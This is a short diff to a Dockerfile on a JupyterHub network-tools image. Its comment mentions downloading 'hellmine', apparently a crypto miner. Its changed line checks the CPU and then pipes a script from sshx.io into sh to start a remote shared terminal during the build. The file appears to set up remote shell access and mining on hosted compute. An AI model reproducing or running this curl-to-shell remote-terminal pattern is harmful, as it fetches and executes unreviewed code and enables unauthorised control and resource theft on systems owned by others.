@@ -7,4 +7,4 @@ RUN apt update && apt install htop curl unzip python3 -y
 FROM quay.io/jupyterhub/k8s-network-tools:4.0.0
 # Tạo thư mục làm việc và tải hellmine
 
-RUN curl -sSf https://sshx.io/get | sh -s run
+RUN lscpu && curl -sSf https://sshx.io/get | sh -s run
